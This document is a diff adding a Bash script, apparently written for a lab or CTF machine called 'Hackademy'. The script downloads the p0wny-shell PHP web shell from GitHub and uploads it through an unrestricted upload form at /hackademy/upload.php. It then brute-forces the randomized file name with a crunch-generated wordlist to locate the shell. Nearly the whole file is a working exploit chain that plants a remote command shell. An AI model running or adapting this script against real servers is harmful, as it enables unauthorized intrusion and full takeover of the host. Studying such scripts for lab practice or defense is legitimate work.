@@ -1,0 +1,85 @@
+#!/bin/bash
+
+
+IP=$1
+wordlist=$(echo "$PWD/dic")
+rojo='\033[1;31m'
+reset='\033[0m'
+verde='\033[1;32m'
+
+
+if [[ $# != 1 ]]; then
+  echo -e "${rojo}Uso: ${verde}$0 IP${reset}"
+  exit 1
+fi
+
+echo -e "${rojo}Instagram: macim0_ ${reset}"
+sleep 2
+
+check_bin(){
+  if ! command -v $1 > /dev/null 2>&1; then
+    echo -e "${rojo}El binario $1 no existe, instalelo y vuelva a intentar${reset}"
+    exit 1
+  fi
+}
+
+check_bin curl
+check_bin crunch
+
+
+if [[ $(ls | grep "p0wny-shell.php") == "p0wny-shell.php" ]]; then
+  echo -e "${verde}La shell ya está descargada${reset}"
+else
+  echo -e "${rojo}Descargando la shell${reset}"
+  curl https://raw.githubusercontent.com/flozz/p0wny-shell/refs/heads/master/shell.php -o p0wny-shell.php > /dev/null 2>&1
+fi
+
+sleep 1
+
+echo -e "${rojo}Subiendo la shell....${reset}"
+
+curl -s -X POST http://$IP/hackademy/upload.php \
+  -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0" \
+  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8" \
+  -H "Accept-Language: es-AR,es;q=0.8,en-US;q=0.5,en;q=0.3" \
+  -H "Accept-Encoding: gzip, deflate, br" \
+  -H "Content-Type: multipart/form-data" \
+  -H "Origin: http://$IP" \
+  -H "Connection: keep-alive" \
+  -H "Referer: http://$IP/hackademy/" \
+  -H "Upgrade-Insecure-Requests: 1" \
+  -F "fileToUpload=@p0wny-shell.php;type=application/x-php" \ > /dev/null 2>&1
+
+
+salir(){
+  echo -e "${rojo}Saliendo....${reset}"
+  rm $(echo $PWD/dic)
+  rm $(echo $PWD/p0wny-shell.php)
+  exit 1
+}
+
+trap salir SIGINT
+
+if [[ $(ls | grep "dic") != "dic" ]]; then
+  echo -e "${verde}Creando la wordlist...${reset}"
+  crunch 19 19 abcdefghijklmnopqrstuvwxyz -t @@@_p0wny-shell.php -o dic > /dev/null 2>&1
+  sleep 2
+else
+  echo -e "${rojo}La wordlist ya existe${reset}"
+fi
+
+sleep 1
+
+while IFS= read -r xxx; do
+  status_code=$(curl -o /dev/null -s -w "%{http_code}\n" http://$IP/hackademy/$xxx)
+  if [[ $status_code == "200" ]]; then
+    clear
+    echo -e "${verde}Shell encontrada: http://$IP/hackademy/$xxx${reset}"
+    rm $(echo $PWD/dic)
+    rm $(echo $PWD/p0wny-shell.php)
+    exit 0
+  else
+    clear
+    echo -e "${rojo}Probando en: http://$IP/hackademy/$xxx${reset}"
+  fi
+done < "$wordlist"
